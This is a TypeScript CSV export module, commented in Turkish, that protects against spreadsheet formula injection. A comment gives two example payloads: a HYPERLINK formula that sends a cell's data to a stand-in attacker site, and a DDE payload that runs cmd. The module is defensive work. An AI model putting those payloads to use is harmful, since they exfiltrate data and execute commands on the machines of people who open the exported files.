/**
 * CSV üretimi (Issue #194).
 *
 * Bu modül DB bilmez, dosya bilmez. Yalnızca "satırları güvenli CSV'ye çevir" işini yapar.
 *
 * BAĞIMLILIK EKLENMEDİ: RFC 4180 CSV, alıntılama ve kaçırma kurallarından ibarettir. Asıl
 * iş kütüphanenin yapamayacağı kısımdadır — aşağıdaki formül enjeksiyonu koruması bir CSV
 * kütüphanesinin sorumluluğu DEĞİLDİR ve çoğu kütüphane bunu yapmaz.
 */

/**
 * Excel/LibreOffice/Google Sheets, bir hücre `=`, `+`, `-`, `@` (ve bazı sürümlerde sekme
 * veya satır başı) ile başlıyorsa onu FORMÜL olarak yorumlar.
 *
 * SALDIRI: kullanıcı bir kategoriye `=HYPERLINK("http://kotu.site?d="&A1,"Tıkla")` adını
 * verir. Dışa aktarmayı açan kişi Excel'de o hücreye tıkladığında tablodaki veri saldırgana
 * gider. `=cmd|'/c calc'!A1` gibi DDE yükleri de aynı sınıftadır.
 *
 * BU BİZİM SORUMLULUĞUMUZDUR: veriyi biz üretiyoruz ve dosyayı bizim kullanıcımız açıyor.
 * "Excel'in sorunu" demek, kendi ürettiğimiz dosyayı silah yapmak olurdu.
 */
const FORMULA_PREFIXES = ["=", "+", "-", "@", "\t", "\r"];

/**
 * Tehlikeli ön ekleri tek tırnakla etkisizleştirir.
 *
 * NEDEN TEK TIRNAK, NEDEN SİLME DEĞİL: Excel baştaki `'` karakterini "bunu metin olarak
 * ele al" direktifi sayar ve hücrede GÖSTERMEZ. Karakteri silmek veriyi bozardı — eksi
 * işaretiyle başlayan meşru bir açıklama ("-500 düzeltmesi") sessizce değişirdi.
 */
export function escapeFormulaInjection(value: string): string {
  if (value.length > 0 && FORMULA_PREFIXES.some((prefix) => value.startsWith(prefix))) {
    return `'${value}`;
  }

  return value;
}

/**
 * Tek bir hücreyi CSV'ye çevirir: önce formül koruması, sonra RFC 4180 alıntılama.
 *
 * SIRA ÖNEMLİ: önce kaçır, sonra alıntıla. Tersi olsaydı eklenen `'` alıntı işaretinin
 * dışında kalır ve ayrıştırmayı bozardı.
 *
 * `null`/`undefined` BOŞ HÜCREDİR, "null" metni değil: dışa aktarılan veri başka bir sisteme
 * girdi olacak ve orada `"null"` bir dize değeri olarak okunurdu.
 */
export function toCsvCell(value: unknown): string {
  if (value === null || value === undefined) {
    return "";
  }

  const raw = value instanceof Date ? value.toISOString() : String(value);
  const text = escapeFormulaInjection(raw);

  if (/[",\r\n]/.test(text)) {
    return `"${text.replace(/"/g, '""')}"`;
  }

  return text;
}

export type CsvColumn<Row> = {
  header: string;
  value: (row: Row) => unknown;
};

/**
 * Satırları CSV metnine çevirir.
 *
 * CRLF SATIR SONU (RFC 4180): Excel'in Windows sürümleri yalnızca `\n` ile üretilmiş
 * dosyalarda çok satırlı hücreleri hatalı ayrıştırabiliyor.
 *
 * BOM EKLENİR: Excel, BOM'suz bir UTF-8 CSV'yi sistem kod sayfasıyla açar ve Türkçe
 * karakterler bozulur ("Kırtasiye" → "KÄ±rtasiye"). BOM, "hem Excel'de açılır hem makine
 * tarafından okunur" şartının Excel yarısıdır; standart ayrıştırıcılar BOM'u yok sayar.
 */
export function toCsv<Row>(rows: readonly Row[], columns: readonly CsvColumn<Row>[]): string {
  const lines = [columns.map((column) => toCsvCell(column.header)).join(",")];

  for (const row of rows) {
    lines.push(columns.map((column) => toCsvCell(column.value(row))).join(","));
  }

  return `﻿${lines.join("\r\n")}\r\n`;
}
